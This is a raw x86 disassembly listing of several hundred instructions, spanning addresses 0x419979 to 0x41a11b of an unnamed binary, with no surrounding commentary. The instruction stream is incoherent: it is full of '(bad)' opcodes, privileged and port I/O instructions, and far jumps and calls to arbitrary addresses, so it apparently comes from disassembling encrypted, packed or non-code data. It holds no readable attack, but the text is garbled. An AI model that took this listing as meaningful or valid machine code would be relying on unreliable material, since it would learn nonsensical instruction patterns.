  419979:	xchg   DWORD PTR [esi+eiz*4-0x2c],edi
  41997d:	jmp    0x419962
  41997f:	addr16 (bad) 
  419982:	ins    BYTE PTR es:[edi],dx
  419983:	mov    eax,0x6b7487f4
  419988:	leave  
  419989:	mov    edi,0xf6cf898
  41998e:	bound  eax,QWORD PTR [edx+0x50]
  419991:	mov    dh,0xa0
  419993:	scas   eax,DWORD PTR es:[edi]
  419994:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419995:	cmp    eax,DWORD PTR [edi+ebp*4-0x15ecee86]
  41999c:	fwait
  41999d:	ret    
  41999e:	mov    ch,0xe9
  4199a0:	adc    dl,BYTE PTR [esi]
  4199a2:	xlat   BYTE PTR ds:[ebx]
  4199a3:	rcr    BYTE PTR [edi+0x3c151331],1
  4199a9:	enter  0x816,0x98
  4199ad:	das    
  4199ae:	mov    al,ds:0xf0d172e4
  4199b3:	mov    al,ds:0xd1dd9485
  4199b8:	xchg   BYTE PTR [ecx-0x63],bl
  4199bb:	lds    eax,FWORD PTR [eax+0x4a]
  4199be:	mov    esp,0xb27814a0
  4199c3:	inc    ebp
  4199c4:	sub    esp,ebp
  4199c6:	mov    ecx,0x95eb9ba9
  4199cb:	rol    BYTE PTR [esi],1
  4199cd:	mov    ecx,0x619007e3
  4199d2:	push   0xffffffb0
  4199d4:	loop   0x41997a
  4199d6:	cmp    al,BYTE PTR [eax]
  4199d8:	aam    0x9
  4199da:	and    DWORD PTR [edi+0x5dbec3d5],0xaaceedf3
  4199e4:	retf   
  4199e5:	scas   al,BYTE PTR es:[edi]
  4199e6:	cli    
  4199e7:	call   0x888f:0xf385cbb5
  4199ee:	push   eax
  4199ef:	mov    eax,ds:0xb16330c6
  4199f4:	repz push 0x12
  4199f7:	mov    al,0x82
  4199f9:	pop    eax
  4199fa:	xchg   ebx,eax
  4199fb:	pop    esp
  4199fc:	jns    0x419a75
  4199fe:	gs stos DWORD PTR es:[edi],eax
  419a00:	out    dx,al
  419a01:	sbb    eax,0x42ad0bb0
  419a06:	dec    BYTE PTR [ecx-0x4c]
  419a09:	mov    WORD PTR [ebx],cs
  419a0b:	rol    BYTE PTR [ebp-0x4a],1
  419a0e:	mov    ds:0xfb58242f,al
  419a13:	out    dx,al
  419a14:	int    0xde
  419a16:	mov    WORD PTR [edi+0x48],fs
  419a19:	leave  
  419a1a:	mov    cl,0x5d
  419a1c:	aas    
  419a1d:	sbb    DWORD PTR [eax+ebp*8+0x3f],ebp
  419a21:	add    al,0xcc
  419a23:	outs   dx,BYTE PTR ds:[esi]
  419a24:	sub    DWORD PTR [ebp-0x7e5f1bc3],0x17306a28
  419a2e:	ret    0x8d05
  419a31:	dec    eax
  419a32:	pop    ds
  419a33:	inc    esp
  419a34:	sbb    al,0x3b
  419a36:	in     eax,dx
  419a37:	pop    ebp
  419a38:	inc    ebp
  419a39:	push   ebx
  419a3a:	int3   
  419a3b:	jg     0x419a85
  419a3d:	pop    eax
  419a3e:	pop    es
  419a3f:	jl     0x4199c6
  419a41:	aad    0xb3
  419a43:	leave  
  419a44:	pop    edi
  419a45:	sbb    edi,DWORD PTR [eax-0x1f841c46]
  419a4b:	push   cs
  419a4c:	cli    
  419a4d:	das    
  419a4e:	xchg   DWORD PTR [edi],ebx
  419a50:	inc    esi
  419a51:	cld    
  419a52:	jecxz  0x419a19
  419a54:	les    esi,FWORD PTR [ebx+edx*2+0x11]
  419a58:	adc    BYTE PTR [edx+0x16881700],dh
  419a5e:	sbb    edi,DWORD PTR [edx+0x148d77aa]
  419a64:	hlt    
  419a65:	les    edx,FWORD PTR [esi]
  419a67:	dec    BYTE PTR [eax-0x225a0110]
  419a6d:	inc    ecx
  419a6e:	mov    WORD PTR [ebx+0x8cc72f1],es
  419a74:	mov    dh,0xdb
  419a76:	dec    edi
  419a77:	jmp    0x7ead2bee
  419a7c:	popf   
  419a7d:	mov    ah,0x72
  419a7f:	xchg   ebx,eax
  419a80:	popf   
  419a81:	(bad)  
  419a82:	cmp    cl,BYTE PTR [ecx+0x414d938a]
  419a88:	adc    eax,0x9317bbf
  419a8d:	mov    ebp,0xd877938e
  419a92:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  419a94:	sub    edi,DWORD PTR [edi-0x7f]
  419a97:	out    0x80,eax
  419a99:	xchg   edi,eax
  419a9a:	cmp    dh,dl
  419a9c:	mov    ebp,0x126f24c7
  419aa1:	int3   
  419aa2:	push   esi
  419aa3:	or     ebp,ebx
  419aa5:	jae    0x419aa6
  419aa7:	dec    esi
  419aa8:	sub    DWORD PTR [edi+0x71],ebx
  419aab:	cmp    esi,DWORD PTR [esi]
  419aad:	adc    eax,0x465b0c80
  419ab2:	daa    
  419ab3:	sti    
  419ab4:	cld    
  419ab5:	cmp    BYTE PTR [eax],dl
  419ab7:	and    dl,BYTE PTR ds:[eax-0x7e789d9b]
  419abe:	adc    al,0x1a
  419ac0:	clc    
  419ac1:	sbb    DWORD PTR [ebp-0x3f],esi
  419ac4:	and    bl,BYTE PTR [ebx-0x18b1f86f]
  419aca:	push   cs
  419acb:	fild   QWORD PTR [edi]
  419acd:	and    edx,edi
  419acf:	xor    DWORD PTR [ecx-0x6431a750],0xadcc9710
  419ad9:	loope  0x419b2e
  419adb:	mov    cl,0x66
  419add:	call   0xe47586af
  419ae2:	mov    bh,BYTE PTR [esi+0xa]
  419ae5:	retf   
  419ae6:	test   al,0x29
  419ae8:	into   
  419ae9:	push   es
  419aea:	out    dx,al
  419aeb:	(bad)  
  419aec:	lods   eax,DWORD PTR ds:[esi]
  419aed:	das    
  419aee:	xchg   esi,eax
  419aef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419af0:	into   
  419af1:	push   ecx
  419af2:	jecxz  0x419b03
  419af4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419af5:	test   DWORD PTR [eax+0x3e85ebc2],0x869f3a14
  419aff:	das    
  419b00:	test   eax,0x3fe425bf
  419b05:	adc    BYTE PTR [esi],al
  419b07:	push   edx
  419b08:	jp     0x419af6
  419b0a:	sahf   
  419b0b:	xchg   dl,ch
  419b0d:	push   ds
  419b0e:	test   al,0x59
  419b10:	mov    ch,0x4b
  419b12:	adc    ch,bh
  419b14:	sti    
  419b15:	in     al,0xf2
  419b17:	add    BYTE PTR [ecx+0x3739fee7],dl
  419b1d:	add    DWORD PTR [edi+0x287d4311],0xffffffdc
  419b24:	test   BYTE PTR ss:[ebx-0xf888e7e],bl
  419b2b:	jp     0x419b14
  419b2d:	dec    edx
  419b2e:	(bad)  
  419b2f:	bnd ret 0x9685
  419b33:	jno    0x419ac6
  419b35:	ror    DWORD PTR [ebx-0x7f9b92e9],0x7b
  419b3c:	jp     0x419b8b
  419b3e:	add    BYTE PTR ds:0x9d5611cf,0x53
  419b45:	sahf   
  419b46:	inc    esi
  419b47:	pushf  
  419b48:	xor    eax,0x2be1ef4
  419b4d:	cmovbe ebp,eax
  419b50:	push   esi
  419b51:	test   al,0xeb
  419b53:	les    ebp,FWORD PTR ds:0xef17c02a
  419b59:	imul   ebx,DWORD PTR [esi+eiz*8+0x1e],0x1b217e3a
  419b61:	cmc    
  419b62:	sub    DWORD PTR [ebp-0x11],0xffffffe0
  419b66:	in     eax,dx
  419b67:	test   eax,0x932fdb24
  419b6c:	xchg   BYTE PTR [ebx],dh
  419b6e:	mov    ebp,0xd4ca2ac3
  419b73:	out    0xaa,al
  419b75:	mov    cl,0x50
  419b77:	cwde   
  419b78:	imul   ecx,DWORD PTR [eax+0x1ea71367],0xffffff9f
  419b7f:	psrlq  mm6,QWORD PTR [edi]
  419b82:	aas    
  419b83:	leave  
  419b84:	pop    esp
  419b85:	jnp    0x419b4e
  419b87:	enter  0x57ad,0x76
  419b8b:	inc    ebp
  419b8c:	popf   
  419b8d:	jmp    0xca626cfd
  419b92:	sar    BYTE PTR ds:0xe2e8e3cb,cl
  419b98:	inc    ebx
  419b99:	mov    WORD PTR [ebp+0x3bf91e4f],?
  419b9f:	sbb    ch,dl
  419ba1:	adc    ah,bh
  419ba3:	test   al,0x29
  419ba5:	pop    ds
  419ba6:	dec    ebx
  419ba7:	pop    esp
  419ba8:	push   esi
  419ba9:	jge    0x419b87
  419bab:	aas    
  419bac:	aaa    
  419bad:	push   edi
  419bae:	or     cl,dl
  419bb0:	idiv   dl
  419bb2:	(bad)  
  419bb3:	fstp   TBYTE PTR [edx]
  419bb5:	cmp    edi,DWORD PTR ds:0xbfa2c12c
  419bbb:	fscale 
  419bbd:	fsubp  st(5),st
  419bbf:	sub    eax,0xd69b48a6
  419bc4:	mov    dh,BYTE PTR [ebp-0x6beb1eba]
  419bca:	in     eax,0x8d
  419bcc:	scas   eax,DWORD PTR es:[edi]
  419bcd:	mov    ch,0xa7
  419bcf:	and    BYTE PTR [edi+0x30625963],bl
  419bd5:	jge    0x419c21
  419bd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419bd8:	jg     0x419ba0
  419bda:	dec    esi
  419bdb:	dec    esp
  419bdc:	dec    ecx
  419bdd:	push   cs
  419bde:	and    bl,BYTE PTR [ebx+0x2c]
  419be1:	and    esi,esp
  419be3:	xor    DWORD PTR [edi-0x6a],0xa6c8f957
  419bea:	imul   ebx,esi,0x45879745
  419bf0:	cmp    BYTE PTR [ebx],ch
  419bf2:	popa   
  419bf3:	into   
  419bf4:	and    edx,esi
  419bf6:	lods   eax,DWORD PTR ds:[esi]
  419bf7:	retf   
  419bf8:	call   0x8b22e241
  419bfd:	push   ds
  419bfe:	or     edx,edi
  419c00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c01:	xchg   BYTE PTR [edx-0x72f22f81],bl
  419c07:	jb     0x419c41
  419c09:	cmp    DWORD PTR [esi-0x17eeaf70],edx
  419c0f:	loope  0x419bef
  419c11:	dec    esi
  419c12:	ror    esp,1
  419c14:	mov    esi,0x28029d31
  419c19:	dec    esi
  419c1a:	data16 arpl WORD PTR [bp+0x1528],sp
  419c20:	icebp  
  419c21:	ins    DWORD PTR es:[edi],dx
  419c22:	ins    BYTE PTR es:[edi],dx
  419c23:	xor    eax,0x2d1a0cb5
  419c28:	xchg   edi,eax
  419c29:	shl    BYTE PTR [ecx],1
  419c2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c2c:	mov    ecx,0x1b3e01fb
  419c31:	or     ah,BYTE PTR [ecx]
  419c33:	jno    0x419bd3
  419c35:	mov    bh,dl
  419c37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c38:	loope  0x419bee
  419c3a:	cli    
  419c3b:	lods   eax,DWORD PTR ds:[esi]
  419c3c:	retf   0x6a44
  419c3f:	dec    esp
  419c40:	fadd   DWORD PTR [edx]
  419c42:	mov    ah,al
  419c44:	mov    bl,0xa3
  419c46:	(bad)  
  419c47:	ds inc edi
  419c49:	jge    0x419ca3
  419c4b:	cs loop 0x419c8a
  419c4e:	xor    al,0xc0
  419c50:	lds    edi,FWORD PTR [eax]
  419c52:	add    eax,0x784c72fc
  419c57:	push   edx
  419c58:	les    ecx,FWORD PTR [eax+0x4536582]
  419c5e:	dec    ebx
  419c5f:	(bad)  
  419c60:	mov    dl,0xb3
  419c62:	xor    DWORD PTR [ebx],ebp
  419c64:	cmc    
  419c65:	push   ebp
  419c66:	push   DWORD PTR [ebx+0x6d]
  419c69:	loopne 0x419c24
  419c6b:	out    dx,eax
  419c6c:	arpl   WORD PTR ds:0x96b2bc19,cx
  419c72:	dec    edx
  419c73:	jp     0x419c70
  419c75:	lea    esi,[ecx-0x58]
  419c78:	add    DWORD PTR [esi+0x5f],edi
  419c7b:	dec    eax
  419c7c:	sbb    bh,BYTE PTR [ecx-0x4e]
  419c7f:	jns    0x419cb3
  419c81:	push   ecx
  419c82:	mov    cl,0xc8
  419c84:	ja     0x419c26
  419c86:	xor    eax,0x92e7183b
  419c8b:	mov    DWORD PTR [ebp-0x13],0x52fd1988
  419c92:	call   0x73b6b893
  419c97:	repz cli 
  419c99:	mov    fs,eax
  419c9b:	add    DWORD PTR [edx+ecx*8+0x4fc4642c],eax
  419ca2:	adc    ah,BYTE PTR [esi]
  419ca4:	icebp  
  419ca5:	xor    DWORD PTR [edx-0x76],ecx
  419ca8:	int3   
  419ca9:	xchg   BYTE PTR [ecx],ch
  419cab:	cwde   
  419cac:	mov    esi,0x3abd72f5
  419cb1:	xchg   ebp,eax
  419cb2:	xlat   BYTE PTR ds:[ebx]
  419cb3:	pop    eax
  419cb4:	int    0xec
  419cb6:	sub    eax,0x9f7b964f
  419cbb:	call   DWORD PTR [ebp-0x4656d3ca]
  419cc1:	fcmovne st,st(2)
  419cc3:	enter  0x2afc,0x1f
  419cc7:	dec    ebp
  419cc8:	shl    dh,1
  419cca:	sub    BYTE PTR [esi],al
  419ccc:	jp     0x419d2a
  419cce:	lods   al,BYTE PTR ds:[esi]
  419ccf:	jae    0x419c7c
  419cd1:	int    0xfe
  419cd3:	and    edx,edx
  419cd5:	stos   DWORD PTR es:[edi],eax
  419cd6:	shl    BYTE PTR [eax],cl
  419cd8:	call   0x61847a2b
  419cdd:	jae    0x419d38
  419cdf:	push   ds
  419ce0:	sahf   
  419ce1:	in     al,0x2b
  419ce3:	in     eax,0x50
  419ce5:	std    
  419ce6:	inc    ebx
  419ce7:	sub    eax,0x1d71f492
  419cec:	add    BYTE PTR [ebp-0x5d],ah
  419cef:	sub    eax,0x6a2ad9f3
  419cf4:	loop   0x419d6f
  419cf6:	mov    ds:0x1cecdd1,al
  419cfb:	pop    edx
  419cfc:	daa    
  419cfd:	xchg   ebx,eax
  419cfe:	sub    edi,DWORD PTR [ebp-0x4096e883]
  419d04:	outs   dx,BYTE PTR ds:[esi]
  419d05:	mov    bh,0xe9
  419d07:	sub    BYTE PTR [edx+esi*1+0x2],cl
  419d0b:	cmc    
  419d0c:	vpacksswb zmm5{k3}{z},zmm2,zmm0
  419d12:	mov    ebx,0x144a968f
  419d17:	mov    al,ds:0xe1a25fb0
  419d1c:	pop    esi
  419d1d:	cmp    BYTE PTR [eax-0x410daf2e],dh
  419d23:	xor    edx,edi
  419d25:	mov    DWORD PTR [eax],esp
  419d27:	ret    0x3952
  419d2a:	shr    BYTE PTR [edi+0x7],0xdb
  419d2e:	outs   dx,DWORD PTR ds:[esi]
  419d2f:	pop    ecx
  419d30:	lods   eax,DWORD PTR ds:[esi]
  419d31:	add    eax,0xdc94f481
  419d36:	fsubr  st(5),st
  419d38:	and    eax,0x15ed2c66
  419d3d:	push   ss
  419d3e:	inc    eax
  419d3f:	sub    edi,DWORD PTR [ebx]
  419d41:	stc    
  419d42:	sbb    eax,DWORD PTR [ebx+0x1d5bc17c]
  419d48:	cmp    ah,BYTE PTR [edi+eax*1]
  419d4b:	test   esi,0xabf9c34b
  419d51:	xor    esi,DWORD PTR [ebx+0x6a30eb96]
  419d57:	ret    0xe50a
  419d5a:	popa   
  419d5b:	jnp    0x419d3b
  419d5d:	pop    ecx
  419d5e:	mov    DWORD PTR [ebp-0x4b4318b8],ecx
  419d64:	mov    cl,0x36
  419d66:	aaa    
  419d67:	fisttp DWORD PTR [ebx]
  419d69:	or     al,0x11
  419d6b:	shl    DWORD PTR [ebx-0x4d],1
  419d6e:	and    al,cl
  419d70:	dec    ebx
  419d71:	inc    ebp
  419d72:	inc    ebx
  419d73:	push   ss
  419d74:	cs leave 
  419d76:	arpl   WORD PTR [edi+0x73376a0],di
  419d7c:	mov    ch,0x5f
  419d7e:	sahf   
  419d7f:	jmp    0xd727396e
  419d84:	fcomip st,st(3)
  419d86:	mov    dl,0xd7
  419d88:	cwde   
  419d89:	pop    esp
  419d8a:	out    0x4b,al
  419d8c:	das    
  419d8d:	out    0xed,eax
  419d8f:	sub    esp,DWORD PTR [edx]
  419d91:	dec    esp
  419d92:	xor    al,0xdf
  419d94:	pop    esi
  419d95:	in     al,dx
  419d96:	push   eax
  419d97:	fisubr DWORD PTR [edi-0x1d]
  419d9a:	pop    ss
  419d9b:	and    ebx,DWORD PTR [ebx]
  419d9d:	test   BYTE PTR [ebx-0x4d],bh
  419da0:	data16 add BYTE PTR [ecx+0x33],cl
  419da4:	pop    ecx
  419da5:	daa    
  419da6:	out    0xb3,al
  419da8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419da9:	push   edi
  419daa:	xchg   DWORD PTR [edx+esi*8+0x40fc920b],esi
  419db1:	daa    
  419db2:	mov    al,ds:0xc52670b1
  419db7:	test   BYTE PTR [edx+0x6785f568],bl
  419dbd:	or     DWORD PTR [ecx-0x63],eax
  419dc0:	xchg   esp,eax
  419dc1:	dec    esi
  419dc2:	adc    edi,edx
  419dc4:	dec    edi
  419dc5:	jbe    0x419d8f
  419dc7:	gs ret 
  419dc9:	jnp    0x419e0f
  419dcb:	out    0x98,eax
  419dcd:	mov    bl,0x5b
  419dcf:	ficom  DWORD PTR ds:0xf2ef2115
  419dd5:	loop   0x419d68
  419dd7:	pop    ecx
  419dd8:	out    0x43,eax
  419dda:	outs   dx,BYTE PTR ds:[esi]
  419ddb:	xor    eax,0x4c
  419dde:	sub    eax,0x3712b6a0
  419de3:	dec    ebx
  419de4:	mov    BYTE PTR [ecx+0x771367e1],dh
  419dea:	xchg   ecx,eax
  419deb:	jae    0x419dfa
  419ded:	pop    es
  419dee:	xchg   ecx,eax
  419def:	loop   0x419da7
  419df1:	and    cl,bl
  419df3:	scas   eax,DWORD PTR es:[edi]
  419df4:	adc    edi,DWORD PTR [esp+edi*2-0x327bb754]
  419dfb:	sub    DWORD PTR [ecx-0x46],ebp
  419dfe:	aas    
  419dff:	add    eax,0xf8b6384a
  419e05:	fcom   st(7)
  419e07:	pop    es
  419e08:	dec    esi
  419e09:	jge    0x419db5
  419e0b:	pop    esi
  419e0c:	addr16 sub dh,ah
  419e0f:	add    eax,edx
  419e11:	pop    es
  419e12:	clc    
  419e13:	inc    esp
  419e14:	lea    ebp,[ecx]
  419e16:	sub    esi,DWORD PTR [ebx]
  419e18:	lock lock inc ecx
  419e1b:	sbb    esi,ebp
  419e1d:	outs   dx,BYTE PTR ds:[esi]
  419e1e:	xchg   edx,eax
  419e1f:	dec    ebx
  419e20:	std    
  419e21:	inc    ecx
  419e22:	or     cl,BYTE PTR [edi]
  419e24:	add    dl,bh
  419e26:	(bad)  
  419e27:	jmp    0x985baab8
  419e2c:	sbb    eax,0xa8e40ffb
  419e31:	inc    esi
  419e32:	mov    edi,eax
  419e34:	ds push ecx
  419e36:	(bad)
  419e39:	dec    esp
  419e3a:	call   0x97ac8f9c
  419e3f:	lds    ebx,FWORD PTR [eax]
  419e41:	pop    ebp
  419e42:	mov    ch,BYTE PTR [ebx+0x4d]
  419e45:	sbb    eax,0x3b09ba70
  419e4a:	icebp  
  419e4b:	int    0x1a
  419e4d:	inc    eax
  419e4e:	add    eax,0x9ebe6a35
  419e53:	xlat   BYTE PTR ds:[ebx]
  419e54:	out    dx,al
  419e55:	xchg   ecx,eax
  419e56:	sbb    BYTE PTR [ecx+0x15dd694],0xdd
  419e5d:	mov    al,0xd3
  419e5f:	out    dx,al
  419e60:	retf   
  419e61:	lds    edx,FWORD PTR [ecx+eax*4]
  419e64:	mov    ebp,0x113f07b2
  419e69:	push   0xe19ad404
  419e6e:	lods   eax,DWORD PTR ds:[esi]
  419e6f:	sbb    BYTE PTR [ebp+0x144b3c41],0x17
  419e76:	leave  
  419e77:	out    0x7d,eax
  419e79:	repnz fnstenv [esi+0x1c]
  419e7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e7e:	adc    bl,BYTE PTR [ebx]
  419e80:	das    
  419e81:	scas   al,BYTE PTR es:[edi]
  419e82:	les    edx,FWORD PTR [edx+0x3c]
  419e85:	xchg   ecx,eax
  419e86:	loopne 0x419e2f
  419e88:	or     BYTE PTR [edx],0x7e
  419e8b:	sbb    al,0x7d
  419e8d:	mov    eax,0xea396125
  419e92:	retf   
  419e93:	iret   
  419e94:	outs   dx,DWORD PTR ds:[esi]
  419e95:	sub    BYTE PTR [ebp+0x72],ch
  419e98:	fsub   DWORD PTR [ebx]
  419e9a:	enter  0xed96,0xfe
  419e9e:	arpl   si,di
  419ea0:	inc    edx
  419ea1:	aam    0xd2
  419ea3:	inc    ebp
  419ea4:	hlt    
  419ea5:	es (bad) 
  419ea7:	and    BYTE PTR [eax+0x19],al
  419eaa:	xor    al,0x49
  419eac:	clc    
  419ead:	push   edx
  419eae:	pop    ebx
  419eaf:	xor    eax,0x2a997252
  419eb4:	or     bl,BYTE PTR [ebp-0x37]
  419eb7:	cmp    ah,BYTE PTR [esi-0x2acf4882]
  419ebd:	cmp    bh,BYTE PTR [esi]
  419ebf:	rcr    DWORD PTR [eax-0x230ed6ab],0x11
  419ec6:	inc    ebx
  419ec7:	mov    ebx,0xc6bc52a6
  419ecc:	jae    0x419ed9
  419ece:	sahf   
  419ecf:	cwde   
  419ed0:	fistp  WORD PTR [esi+0x30]
  419ed3:	arpl   WORD PTR [edx],cx
  419ed5:	add    BYTE PTR [ebp+0x28f724b1],bl
  419edb:	fwait
  419edc:	sub    DWORD PTR [edi+0x7a61a052],ecx
  419ee2:	dec    edx
  419ee3:	mov    al,0x93
  419ee5:	loop   0x419f42
  419ee7:	jmp    0xc53d:0x67f3a04e
  419eee:	mov    dh,0x75
  419ef0:	and    ch,BYTE PTR [ebx-0x57]
  419ef3:	test   BYTE PTR [esi],al
  419ef5:	pop    edi
  419ef6:	sub    BYTE PTR [ebx+0x7f],0x22
  419efa:	std    
  419efb:	mov    al,0x69
  419efd:	dec    edx
  419efe:	(bad)
  419f02:	dec    ecx
  419f03:	xlat   BYTE PTR ds:[ebx]
  419f04:	sbb    al,0xd2
  419f06:	sbb    ecx,ecx
  419f08:	mov    cl,0xa8
  419f0a:	xor    eax,0x22d2dc42
  419f0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f10:	push   ss
  419f11:	or     eax,DWORD PTR [esp+ecx*4+0x61e496de]
  419f18:	cwde   
  419f19:	and    bh,BYTE PTR ds:0xe01e9aa2
  419f1f:	inc    eax
  419f20:	sbb    al,0xb
  419f22:	inc    edx
  419f23:	jbe    0x419f10
  419f25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f26:	stos   DWORD PTR es:[edi],eax
  419f27:	aas    
  419f28:	outs   dx,BYTE PTR ds:[esi]
  419f29:	sbb    al,0xcb
  419f2b:	or     al,0xb4
  419f2d:	dec    esp
  419f2e:	cmp    al,0x80
  419f30:	pop    edi
  419f31:	(bad)  
  419f33:	xor    BYTE PTR [ebx+0x2b],bh
  419f36:	or     ebp,DWORD PTR [ecx+0x12]
  419f39:	outs   dx,BYTE PTR ds:[esi]
  419f3a:	adc    bh,ch
  419f3c:	mov    ebx,0xa53e956b
  419f41:	jp     0x419f4d
  419f43:	or     eax,0xdb49969a
  419f48:	mov    al,ds:0xde4da91d
  419f4d:	cmp    DWORD PTR [edi+esi*4],eax
  419f50:	sub    al,BYTE PTR [ecx+0x35ea1992]
  419f56:	push   esi
  419f57:	sub    BYTE PTR [ecx],dl
  419f59:	jb     0x419fbe
  419f5b:	add    al,0x9b
  419f5d:	jb     0x419f37
  419f5f:	mov    cs,WORD PTR [ebx]
  419f61:	loop   0x419f02
  419f63:	mov    esp,0xb142a790
  419f68:	rol    DWORD PTR [eax],cl
  419f6a:	bound  esi,QWORD PTR [ebp-0x33]
  419f6d:	cmp    eax,0x146b5c3b
  419f72:	es mov edx,0x3a764d1b
  419f78:	xchg   ecx,eax
  419f79:	mov    edx,edi
  419f7b:	or     cl,BYTE PTR [edx-0x6e42428b]
  419f81:	pop    esi
  419f82:	jne    0x41a003
  419f84:	mov    cl,0xfc
  419f86:	sub    cl,BYTE PTR [edi+edi*8]
  419f89:	jno    0x419f22
  419f8b:	(bad)  
  419f8d:	int    0x54
  419f8f:	in     eax,dx
  419f90:	cmp    BYTE PTR [esi-0x54],0xf3
  419f94:	jg     0x419f37
  419f96:	sbb    dl,BYTE PTR [edx+0x245eee71]
  419f9c:	aas    
  419f9d:	iret   
  419f9e:	add    al,BYTE PTR ds:0x3457a676
  419fa4:	js     0x419fac
  419fa6:	fstp   QWORD PTR [edx-0x52270ea1]
  419fac:	sub    DWORD PTR [ecx+0x56a0aae6],esi
  419fb2:	arpl   si,cx
  419fb4:	std    
  419fb5:	lock shr DWORD PTR [ebx],0xf6
  419fb9:	fsubrp st(2),st
  419fbb:	jecxz  0x41a036
  419fbd:	mov    dl,0x4e
  419fbf:	outs   dx,DWORD PTR ds:[esi]
  419fc0:	ins    DWORD PTR es:[edi],dx
  419fc1:	inc    edx
  419fc2:	leave  
  419fc3:	jo     0x41a034
  419fc5:	add    BYTE PTR ss:[ecx+0x59],0xf9
  419fca:	lods   al,BYTE PTR ds:[esi]
  419fcb:	mov    ds:0x22917c4d,eax
  419fd0:	cld    
  419fd1:	into   
  419fd2:	fcom   DWORD PTR [eax-0x32]
  419fd5:	dec    edi
  419fd6:	clc    
  419fd7:	ret    
  419fd8:	fdivr  QWORD PTR [ebp+0x3c]
  419fdb:	sti    
  419fdc:	out    0xb,eax
  419fde:	cmp    BYTE PTR [ebx-0x4b448a22],0x1a
  419fe5:	in     al,0x86
  419fe7:	(bad)  [edi]
  419fe9:	aad    0x2
  419feb:	pusha  
  419fec:	mov    al,ds:0xfa0fb777
  419ff1:	mov    dh,0xfc
  419ff3:	mov    bh,0x5f
  419ff5:	test   eax,0x7ad639d
  419ffa:	hlt    
  419ffb:	xor    DWORD PTR [eax-0x1d],esp
  419ffe:	sub    DWORD PTR [esi+esi*2-0x61f14019],ecx
  41a005:	sti    
  41a006:	sti    
  41a007:	call   0xea227089
  41a00c:	and    cl,BYTE PTR [edx+0x68]
  41a00f:	leave  
  41a010:	bound  esp,QWORD PTR [ebx-0x60]
  41a013:	in     al,dx
  41a014:	stc    
  41a015:	jno    0x419ff1
  41a017:	test   eax,0x747d2d33
  41a01c:	or     DWORD PTR [eax+0x20],esi
  41a01f:	push   ss
  41a020:	rcr    ecx,1
  41a022:	ds add al,0x53
  41a025:	mov    ds:0x6d30b64b,eax
  41a02a:	mov    esp,0x81197453
  41a02f:	cmp    eax,0x7290af41
  41a034:	(bad)
  41a038:	mov    ds:0x9a8b0a44,eax
  41a03d:	ret    
  41a03e:	popa   
  41a03f:	outs   dx,DWORD PTR gs:[esi]
  41a041:	(bad)  
  41a043:	cmp    dl,dh
  41a045:	stc    
  41a046:	jo     0x41a046
  41a048:	push   esi
  41a049:	maskmovq mm1,(bad)
  41a04a:	test   DWORD PTR [esi-0x2c],0x147b865c
  41a051:	hlt    
  41a052:	mov    DWORD PTR [ecx-0x1ca59c69],ebx
  41a058:	mov    ebx,0xdbe7af2f
  41a05d:	push   cs
  41a05e:	xchg   ebp,eax
  41a05f:	pop    edx
  41a060:	sub    DWORD PTR [ebp+edi*2+0x38b3af39],edx
  41a067:	sub    ecx,DWORD PTR [edi+0x368642d]
  41a06d:	loope  0x41a09a
  41a06f:	sub    eax,0x429978b1
  41a074:	daa    
  41a075:	imul   eax,eax,0xffffffff
  41a078:	test   eax,0x67334fec
  41a07d:	mov    edx,0xe7be654c
  41a082:	mov    ebp,0x911f779b
  41a087:	push   ebx
  41a088:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a089:	(bad)  
  41a08a:	pop    edi
  41a08b:	call   0xce66c221
  41a090:	in     al,0x5a
  41a092:	mov    dl,BYTE PTR [eax-0x76]
  41a095:	lahf   
  41a096:	sub    eax,eax
  41a098:	cmp    DWORD PTR [ebx-0x5f],0x22
  41a09c:	imul   edi,DWORD PTR [edx],0xf1d72f27
  41a0a2:	jae    0x41a056
  41a0a4:	add    DWORD PTR [edi+ebp*2+0x42],eax
  41a0a8:	sub    al,0x70
  41a0aa:	ins    DWORD PTR es:[edi],dx
  41a0ab:	sbb    al,0x53
  41a0ad:	es repnz mov ebp,0x9387cbc4
  41a0b4:	jno    0x41a102
  41a0b6:	rcr    al,0xa7
  41a0b9:	retf   0xdbe8
  41a0bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a0bd:	mov    WORD PTR [eax],ss
  41a0bf:	sysret 
  41a0c1:	or     al,0x6a
  41a0c3:	loope  0x41a097
  41a0c5:	icebp  
  41a0c6:	add    al,0x3
  41a0c8:	je     0x41a05b
  41a0ca:	shl    edx,1
  41a0cc:	test   DWORD PTR [esi+edi*1-0x20faf4e7],eax
  41a0d3:	sti    
  41a0d4:	xor    eax,0x5231c342
  41a0d9:	in     al,dx
  41a0da:	cwde   
  41a0db:	jl     0x41a0d9
  41a0dd:	pop    ss
  41a0de:	mov    al,ds:0xc454fcd3
  41a0e3:	stos   DWORD PTR es:[edi],eax
  41a0e4:	adc    eax,DWORD PTR [ecx-0x3bc5e05]
  41a0ea:	mov    ecx,DWORD PTR [esi]
  41a0ec:	sti    
  41a0ed:	add    DWORD PTR [edx+eax*2],ebx
  41a0f0:	and    edx,DWORD PTR [edi-0xd]
  41a0f3:	push   0xf99f0ee6
  41a0f8:	sub    cl,cl
  41a0fa:	dec    edi
  41a0fb:	fld    st(2)
  41a0fd:	pop    esi
  41a0fe:	std    
  41a0ff:	cmp    dl,ch
  41a101:	cmp    eax,0xce902c6c
  41a106:	sub    DWORD PTR [ecx],esi
  41a108:	shl    DWORD PTR [edx],cl
  41a10a:	stos   DWORD PTR es:[edi],eax
  41a10b:	in     eax,0x49
  41a10d:	(bad)  
  41a10e:	dec    esi
  41a10f:	sub    eax,0xda13bdbf
  41a114:	iret   
  41a115:	mov    esp,0x82ed7c51
  41a11a:	push   esp
  41a11b:	call   0xfcd08585
